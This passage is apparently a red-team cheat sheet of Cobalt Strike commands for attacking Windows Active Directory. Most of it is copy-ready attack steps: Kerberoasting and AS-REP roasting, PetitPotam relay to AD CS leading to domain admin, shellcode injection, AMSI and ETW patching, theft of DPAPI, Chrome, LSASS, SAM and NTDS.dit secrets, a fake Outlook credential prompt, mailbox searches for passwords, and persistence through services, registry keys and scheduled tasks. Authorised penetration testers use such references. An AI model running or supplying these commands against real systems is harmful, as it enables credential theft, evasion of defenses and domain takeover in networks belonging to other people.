|             | # Kerberoast all users                                                                                                                                                                                                                                                                                                 |
|             | powershell Invoke-Kerberoast - OutputFormat hashcat \| fl                                                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Kerberoast specific user                                                                                                                                                                                                                                                                                             |
|             | powershell Invoke-Kerberoast -Identity testaccount -Domain lab.com -OutputFormat hashcat \| fl                                                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | Rubeus kerberoasting                                                                                                                                                                                                                                                                                                   |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Kerberoast all users                                                                                                                                                                                                                                                                                                 |
|             | execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com                                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Kerberoast specific user                                                                                                                                                                                                                                                                                             |
|             | execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com                                                                                                                                                                                                                      |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### AS-REP Roasting                                                                                                                                                                                                                                                                                                    |
|             | Target users in AD that do not require pre-authentication&lt;br /&gt;                                                                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # AS-REP roast all users with Rubeus                                                                                                                                                                                                                                                                                   |
|             | execute-assembly C:\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep-hashes.txt                                                                                                                                                                                                                            |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # AS-REP roast specific user with Rubeus                                                                                                                                                                                                                                                                               |
|             | execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfile:C:\Temp\asrep-hashes.txt                                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Coercion attacks                                                                                                                                                                                                                                                                                                   |
|             | #### [PetitPotam](https://github.com/topotam/PetitPotam) - NTLM relay to AD CS                                                                                                                                                                                                                                         |
|             | &gt; PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions                                                                                                                                                                                             |
|             | - Requires AD CS web server enrollment enabled                                                                                                                                                                                                                                                                         |
|             | - Requries Kali running Impacket on target domain                                                                                                                                                                                                                                                                      |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Find AD CS web server and verify if web enrollment is enabled by browsing to the URL: `http://ADCS-server.domain.com/certsrv/`                                                                                                                                                                                       |
|             | run certutil.exe                                                                                                                                                                                                                                                                                                       |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Start NTLM relay server on Kali                                                                                                                                                                                                                                                                                      |
|             | python3 ntlmrelayx.py -t http://ADCS-server.domain.com/certsrv/certfnsh.asp -smb2support --adcs --template DomainController                                                                                                                                                                                            |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Force coercion via PetitPotam in Cobalt Strike Beacon - Observe &#34;Attack Success!!!&#34; in output if it worked                                                                                                                                                                                                   |
|             | run PetitPotam.exe &lt;Kali-Listener-IP&gt; &lt;DC-IP&gt;                                                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # NTLM relay output will have base64 ticket of target DC machine account                                                                                                                                                                                                                                               |
|             | # Use Rubeus to request TGT of DC machine account to esclate to Domain Admin                                                                                                                                                                                                                                           |
|             | execute-assembly C:\Rubeus.exe asktgt /dc:&lt;DC-IP&gt; /domain:domain.com /user:&lt;DC-Machine-account&gt;$ /ptt /certificate:&lt;base64-ticket-from-output&gt;                                                                                                                                                       |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Verify asktgt command worked by doing an &#39;ls&#39; command on the DC                                                                                                                                                                                                                                              |
|             | ls \\&lt;DC-IP&gt;\c$                                                                                                                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | References:                                                                                                                                                                                                                                                                                                            |
|             | - [https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/](https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/)                                                                                                                                                                             |
|             | - [https://hakin9.org/domain-takeover-with-petitpotam-exploit/](https://hakin9.org/domain-takeover-with-petitpotam-exploit/)                                                                                                                                                                                           |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | ## Defense Evasion                                                                                                                                                                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Shellcode injection techniques                                                                                                                                                                                                                                                                                     |
|             | Several methods here within Cobalt Strike or using BOFs                                                                                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Spawn a beacon into an existing process                                                                                                                                                                                                                                                                              |
|             | inject &lt;PID&gt; &lt;x86\|x64&gt; HTTPSLISTENER                                                                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Inject raw shellcode into an existing process                                                                                                                                                                                                                                                                        |
|             | # Create shellcode: Cobbalt Strike --&gt; Attacks --&gt; Packages --&gt; Windows Executable (S) --&gt; Output = Raw --&gt; Creates &#34;beacon.bin&#34; file                                                                                                                                                           |
|             | shinect &lt;PID&gt; &lt;x86\|x64&gt; C:\beacon.bin                                                                                                                                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Shellcode injection methods using Windows syscalls with [BOFs script](https://github.com/ajpc500/BOFs)                                                                                                                                                                                                               |
|             | syscalls_inject &lt;PID&gt; &lt;listener_name&gt;                                                                                                                                                                                                                                                                      |
|             | syscalls_shinject &lt;PID&gt; C:\beacon.bin                                                                                                                                                                                                                                                                            |
|             | static_syscalls_inject &lt;PID&gt; &lt;listener_name&gt;                                                                                                                                                                                                                                                               |
|             | static_syscalls_shinject &lt;PID&gt; C:\beacon.bin                                                                                                                                                                                                                                                                     |
|             | syscalls_shspawn C:\beacon.bin                                                                                                                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### AMSI patch                                                                                                                                                                                                                                                                                                         |
|             | [BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit) for current process &lt;br /&gt;                                                                                                                                                                                                                             |
|             | `patchit amsi`                                                                                                                                                                                                                                                                                                         |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [boku7/InjectAmsiBypass](https://github.com/boku7/injectAmsiBypass) BOF &lt;br /&gt;                                                                                                                                                                                                                                   |
|             | Patch AMSI in remote process                                                                                                                                                                                                                                                                                           |
|             | `inject-amsiBypass &lt;PID&gt;`                                                                                                                                                                                                                                                                                        |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### ETW patch                                                                                                                                                                                                                                                                                                          |
|             | [BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit) for current process &lt;br /&gt;                                                                                                                                                                                                                             |
|             | `patchit etw`                                                                                                                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [ajpc500/BOFs](https://github.com/ajpc500/BOFs/) ETW patch for current process&lt;br /&gt;                                                                                                                                                                                                                             |
|             | `etw stop` / `etw start`                                                                                                                                                                                                                                                                                               |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### API Unhooking                                                                                                                                                                                                                                                                                                      |
|             | Cobalt Strike&#39;s hail-mary unhooking function. &#34;This is a Beacon Object File to refresh DLLs and remove their hooks. The code is from Cylance&#39;s Universal Unhooking research&#34; &lt;br /&gt;                                                                                                              |
|             | `unbook`                                                                                                                                                                                                                                                                                                               |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | ## Exploitation                                                                                                                                                                                                                                                                                                        |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### DPAPI decryption and extraction on Windows systems                                                                                                                                                                                                                                                                 |
|             | [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)                                                                                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # SharpDPAPI to retrieve domain DPAPI backup key and output to file which is used for subsequent attacks (requires DA privileges)                                                                                                                                                                                      |
|             | execute-assembly C:\SharpDPAPI.exe backupkey /file:key.pvk                                                                                                                                                                                                                                                             |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Decrypt any RDG (remote desktop) passwords found using the domain backup key (can also use local Admin account or master key)                                                                                                                                                                                        |
|             | execute-assembly C:\SharpDPAPI.exe rdg /pvk:key.pvk /unprotect                                                                                                                                                                                                                                                         |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Decrypt any KeePass passwords found using the domain backup key (can also use local Admin account or master key)                                                                                                                                                                                                     |
|             | execute-assembly C:\SharpDPAPI.exe keepass /pvk:key.pvk /unprotect                                                                                                                                                                                                                                                     |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | SharpChrome to extract and decrypt a user&#39;s Chrome sessions/passwords                                                                                                                                                                                                                                              |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Dump Chrome logins on the local system for the current user                                                                                                                                                                                                                                                          |
|             | execute-assembly C:\SharpChrome.exe logins /unprotect                                                                                                                                                                                                                                                                  |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Dump Chrome cookies on the local system for the current user                                                                                                                                                                                                                                                         |
|             | execute-assembly C:\SharpChrome.exe cookies                                                                                                                                                                                                                                                                            |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Dump Chrome cookies on the local system only for a specific URL - Output in JSON format to import into &#34;Cookie Editor&#34; browser extension                                                                                                                                                                     |
|             | execute-assembly C:\SharpChrome.exe cookies /format:json /browser:chrome /url:&#34;.*microsoft.com&#34;                                                                                                                                                                                                                |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)                                                                                                                                                                                                     |
|             | execute-assembly C:\SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.com                                                                                                                                                                                                                                         |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)                                                                                                                                                                           |
|             | # Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor                                                                                                                                                                                                                                   |
|             | execute-assembly C:\SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [SharpWeb](https://github.com/djhohnstein/SharpWeb) - Retrieve saved credentials in Chrome, Firefox and Edge                                                                                                                                                                                                       |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Retrive all saved browser credentials                                                                                                                                                                                                                                                                                |
|             | execute-assembly C:\SharpWeb.exe all                                                                                                                                                                                                                                                                                   |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Active Directory Certificate Services (AD CS) Attack                                                                                                                                                                                                                                                               |
|             | [Certify - GhostPack](https://github.com/GhostPack/Certify) &lt;br /&gt;                                                                                                                                                                                                                                               |
|             | Enumerate and abuse misconfigurations in AD CS &lt;br /&gt;                                                                                                                                                                                                                                                            |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Find vulnerable certificates with Certify.exe                                                                                                                                                                                                                                                                        |
|             | execute-assembly C:\Certify.exe find /vulnerable /domain:lab.com                                                                                                                                                                                                                                                       |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Request a new certificate for a vulnerable template from the above output                                                                                                                                                                                                                                            |
|             | execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTemplate /altname:DomainAdminUser1                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus                                                                                                                                                                                          |
|             | execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com                                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [Certipy - Python](https://github.com/ly4k/Certipy)&lt;br /&gt;                                                                                                                                                                                                                                                        |
|             | Use Python through a SOCKS proxy or a Linux VM on the domain to find and exploit misconfigured AD CS certs&lt;br /&gt;                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # First, start a SOCKS proxy in Cobalt Strike (or skip to the next step if you have an on-site Linux VM)                                                                                                                                                                                                               |
|             | socks &lt;port&gt; socks5                                                                                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Configure proxychains on Kali/Linux VM to proxy traffic through C2                                                                                                                                                                                                                                                   |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Find vulnerable certs with Certipy through proxy                                                                                                                                                                                                                                                                     |
|             | proxychains certipy find -u &#39;my-user@domain.com&#39; -p &#39;PASSWORD&#39; -dc-ip 10.100.32.200 -vulnerable -timeout 30                                                                                                                                                                                            |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Request a certificate for a vulnerable cert template through proxy                                                                                                                                                                                                                                                   |
|             | proxychains certipy req -u &#39;my-user@domain.com&#39; -p &#39;PASSWORD&#39; -dc-ip 10.100.32.200 -ca corp-DC-CA -target ca.domain.com -template VulnTemplate -debug -upn &#39;DomainAdminAcc@domain.com&#39;                                                                                                         |
|             | # Authenticate with the output .PFX cert file to reequset a TGT for the DomainAdminAcc user                                                                                                                                                                                                                            |
|             | proxychains certipy auth -pfx DomainAdminAcc.pfx -username DomainAdminAcc -domain &#39;domain.com&#39; -dc-ip X.X.X.X                                                                                                                                                                                                  |
|             | --&gt; Command will output NTLM hash of target account and the user&#39;s certificate                                                                                                                                                                                                                                  |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Use the output certificate of the DomainAdminAcc account with Rubeus                                                                                                                                                                                                                                                 |
|             | execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminAcc /certificate:DomainAdminAcc.pfx /ptt /domain:domain.com /dc:DomainController.domain.com                                                                                                                                                                     |
|             | ls \\DomainController\c$ --&gt; Verify command was successfully by doing an &#39;ls&#39; cmd on the DC                                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [MalSCCM](https://github.com/nettitude/MalSCCM) - Exploiting SCCM servers to deploy malicious applications&lt;br /&gt;                                                                                                                                                                                             |
|             | - Requires admin privileges on target SCCM server                                                                                                                                                                                                                                                                      |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Find the SCCM management servers                                                                                                                                                                                                                                                                                     |
|             | execute-assembly C:\MalSCCM.exe locate                                                                                                                                                                                                                                                                                 |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Check if the current host is an SCCM client                                                                                                                                                                                                                                                                          |
|             | execute-assembly C:\MalSCCM.exe                                                                                                                                                                                                                                                                                        |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Gather all info from SCCM including users, groups, forest, application, deployments                                                                                                                                                                                                                                  |
|             | execute-assembly C:\MalSCCM.exe inspect /all /server:&lt;PrimarySiteFQDN&gt;                                                                                                                                                                                                                                           |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # You can use MalSCCM to deploy a malicious application to a target group then force the users to check-in and run your payload                                                                                                                                                                                        |
|             | # This is explained in MUCH more details in the walkthrough here: https://labs.nettitude.com/blog/introducing-malsccm/                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | ## Exfiltration - Password Attacks                                                                                                                                                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Dumping LSASS locally (all commands below require local Admin)                                                                                                                                                                                                                                                     |
|             | Mimikatz built-in to dump passwords/hashes to console                                                                                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Works against most updated systems with AV/EDR if running as SYSTEM                                                                                                                                                                                                                                                  |
|             | logonpasswords                                                                                                                                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but can still output LSASS dump file)                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | upload --&gt; ProcDump.exe                                                                                                                                                                                                                                                                                             |
|             | run ProcDump.exe -accepteula -ma lsass.exe lsass.dmp                                                                                                                                                                                                                                                                   |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | Dumping LSASS with [Out-Minidump.ps1 from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) without touching disk                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell Get-Process \| Out-Minidump -DumpFilePath C:\temp                                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | Extract LSASS process with [SafetyKatz](https://github.com/GhostPack/SafetyKatz)                                                                                                                                                                                                                                       |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | execute-assembly C:\SafetyKatz.exe --&gt; Dumps LSASS process to .dmp file on the local system                                                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | LSASS dump BOFs                                                                                                                                                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | minidumpwritedump --&gt; https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump                                                                                                                                                                                                                                    |
|             | nanodump --&gt; https://github.com/fortra/nanodump                                                                                                                                                                                                                                                                     |
|             | ppldump &lt;YOUR_PROTECTED_PROCESS_PID&gt; --&gt; https://github.com/EspressoCake/PPLDump_BOF                                                                                                                                                                                                                          |
|             | static_syscalls_dump &lt;PID&gt; C:\Users\USER\Desktop\output.dmp --&gt; https://github.com/ajpc500/BOFs/blob/main/StaticSyscallsDump/README.md                                                                                                                                                                        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | Extracting passwords/hashes offline from LSASS dump using Mimikatz (**ON YOUR OWN SYSTEM!**)                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | mimikatz.exe log &#34;privilege::debug&#34; &#34;sekurlsa::minidump lsass.dmp&#34; &#34;sekurlsa::logonpasswords /all&#34; &#34;sekurlsa::wdigest&#34; exit (Run on your local box)                                                                                                                                    |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### SAM database dump                                                                                                                                                                                                                                                                                                  |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | SAM dump built into CS - Injects into LSASS to dump local SAM database hashes to console                                                                                                                                                                                                                               |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | hashdump                                                                                                                                                                                                                                                                                                               |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | SAM dump using reg.exe                                                                                                                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | run reg.exe save HKLM\sam sam.save                                                                                                                                                                                                                                                                                     |
|             | run reg.exe save HKLM\security security.save                                                                                                                                                                                                                                                                           |
|             | run reg.exe save HKLM\system system.save                                                                                                                                                                                                                                                                               |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Download SAM files then dump hahses offline using Secretsdump.py                                                                                                                                                                                                                                                     |
|             | download sam.save                                                                                                                                                                                                                                                                                                      |
|             | download security.save                                                                                                                                                                                                                                                                                                 |
|             | download system.save                                                                                                                                                                                                                                                                                                   |
|             | python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL (Run **ON YOUR OWN SYSTEM**)                                                                                                                                                                                                     |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump) SAM and LSA extraction                                                                                                                                                                                                                                |
|             | Remotely dump SAM and LSA secrets (same functionality as Impacket&#39;s secretsdump.py)                                                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Runs in the context of the current user                                                                                                                                                                                                                                                                              |
|             | # Local Admin privileges is required on the target machine                                                                                                                                                                                                                                                             |
|             | execute-assembly C:\SharpSecDump.exe -target=192.168.1.15 -u=admin -p=Password123 -d=lab.local                                                                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### NTDS.dit dump (all commands below require Domain Admin privileges!)                                                                                                                                                                                                                                                |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [Invoke-DCSync.ps1](https://gist.github.com/monoxgas/9d238accd969550136db) to perform DCSync attacks remotely                                                                                                                                                                                                          |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import --&gt; Invoke-DCSync.ps1                                                                                                                                                                                                                                                                             |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Perform DC Sync hash dump for all users in the target domain                                                                                                                                                                                                                                                         |
|             | powershell Invoke-DCSync -Domain lab.local [-DomainController ops-dc01.lab.local]                                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Perform DC Sync hash dump for all users in the specified group                                                                                                                                                                                                                                                       |
|             | powershell Invoke-DCSync -Domain lab.local -GroupName &#34;Domain Admins&#34; \| ft -wrap -autosize                                                                                                                                                                                                                    |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | [Copy-VSS.ps1 from Nishang toolkit](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1) to dump NTDS.dit locally on the DC                                                                                                                                                                         |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import --&gt; Copy-VSS.ps1                                                                                                                                                                                                                                                                                  |
|             | powerpick Copy-VSS -DestinationDir C:\temp                                                                                                                                                                                                                                                                             |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | NTDSutil.exe to dump NTDS.dit locally on a Domain Controller                                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit \| ntdsutil                                                                                                                                                                                                                              |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### Credential Prompt                                                                                                                                                                                                                                                                                                  |
|             | [CredPrompt](https://github.com/guervild/BOFs/tree/dev/CredPrompt) to ask the current user for their username/password.                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | credprompt &#34;Credentials are required to re-authenticate to Outlook:&#34;                                                                                                                                                                                                                                           |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | ## Exfiltration - Email                                                                                                                                                                                                                                                                                                |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [MailSniper](https://github.com/dafthack/MailSniper)                                                                                                                                                                                                                                                               |
|             | PowreShell tool to search mailboxes in a Microsoft Exchange environment                                                                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | powershell-import -&gt; Select MailSniper.ps1                                                                                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Search all mailboxes in a domain - Looks for &#34;*password*&#34;,&#34;*creds*&#34;,&#34;*credentials*&#34;                                                                                                                                                                                                          |
|             | powershell Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname ExchangeHost.domain.com -OutputCsv global-email-search.csv                                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Search the current users mailbox                                                                                                                                                                                                                                                                                     |
|             | powershell Invoke-SelfSearch -Mailbox current-user@domain.com                                                                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Get the Global Address List (GAL)                                                                                                                                                                                                                                                                                    |
|             | powershell Get-GlobalAddressList -ExchHostname ExchangeHost.domain.com -UserName domain\username -Password P@ssw0rd! -OutFile gal.txt                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | ## Persistence                                                                                                                                                                                                                                                                                                         |
|             | [SharpStay](https://github.com/0xthirteen/SharpStay) - .NET Persistence                                                                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # Scheduled task persistence                                                                                                                                                                                                                                                                                           |
|             | execute-assembly C:\Sharpstay.exe action=ScheduledTask taskname=TestTask command=&#34;C:\windows\temp\file.exe&#34; runasuser=testuser triggertype=logon author=Microsoft Corp. description=&#34;Test Task&#34; logonuser=testuser                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Service creation persistence                                                                                                                                                                                                                                                                                         |
|             | execute-assembly C:\Sharpstay.exe action=CreateService servicename=TestService command=&#34;C:\Windows\temp\file.exe&#34;                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # User registry key persistence                                                                                                                                                                                                                                                                                        |
|             | execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command=&#34;C:\Windows\temp\file.exe&#34;                                                                                                                                           |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Many other methods available on the tool&#39;s github documentation                                                                                                                                                                                                                                                  |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | [SharpPersist](https://github.com/fireeye/SharPersist)                                                                                                                                                                                                                                                                 |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | # List persistence entries                                                                                                                                                                                                                                                                                             |
|             | execute-assembly C:\SharPersist.exe -t [reg,schtaskbackdoor,startupfolder,service] -m list                                                                                                                                                                                                                             |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Registy persistence                                                                                                                                                                                                                                                                                                  |
|             | execute-assembly C:\SharPersist.exe -t reg -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c payload.exe&#34; -k &#34;hkcurun&#34; -v &#34;Test Payload&#34; -m add -o env                                                                                                                                           |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Scheduled task backdoor persistence                                                                                                                                                                                                                                                                                  |
|             | execute-assembly C:\SharPersist.exe -t schtaskbackdoor -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c payload.exe&#34; -n &#34;Test Scheduled Task&#34; -m add -o daily                                                                                                                                           |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Startup folder persistence                                                                                                                                                                                                                                                                                           |
|             | execute-assembly C:\SharPersist.exe -t startupfolder -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c payload.exe&#34; -f &#34;Test File on Startup&#34; -m add                                                                                                                                                     |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | # Windows service persistence                                                                                                                                                                                                                                                                                          |
|             | execute-assembly C:\SharPersist.exe -t service -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c payload.exe&#34; -n &#34;Test Service&#34; -m add                                                                                                                                                                   |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [StayKit](https://github.com/0xthirteen/StayKit) - Cobalt Strike persistence kit aggressor script                                                                                                                                                                                                                      |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | # Cobalt Strike BOFs                                                                                                                                                                                                                                                                                                   |
|             | [My BOF Collection GitHub page](https://github.com/wsummerhill/CobaltStrike_BOF_Collections)                                                                                                                                                                                                                           |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ### [BOF.NET](https://github.com/CCob/BOF.NET/pull/1)                                                                                                                                                                                                                                                                  |
|             | A .NET runtime tool to load assemblies in memory and avoid the typical fork-and-run model from `execute-assembly`. Use BOF.NET to run any .NET tool for better evasion by residing in your current process. Note that this will not bypass AMSI or ETW as those will have to be unhooked separately, if needed.        |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             | bofnet_init                                                                                                                                                                                                                                                                                                            |
|             | bofnet_load /path/to/assembly.exe                                                                                                                                                                                                                                                                                      |
|             | bofnet_listassemblies                                                                                                                                                                                                                                                                                                  |
|             | bofnet_executeassembly AssemblyName argument1 argument2                                                                                                                                                                                                                                                                |
|             | ```                                                                                                                                                                                                                                                                                                                    |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | ------------------------------------------------------------------------------------------                                                                                                                                                                                                                             |
|             | # References                                                                                                                                                                                                                                                                                                           |
|             | [Cobalt Strike commands cheat sheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)                                                                                                                                                                                                                          |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [AD exploitation cheat sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)                                                                                                                                                                                                                |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [Sharphound](https://github.com/BloodHoundAD/SharpHound3)                                                                                                                                                                                                                                                              |
|             |                                                                                                                                                                                                                                                                                                                        |
|             | [PowerShell remoting cheat sheet](https://blog.netspi.com/powershell-remoting-cheatsheet/)                                                                                                                                                                                                                             |
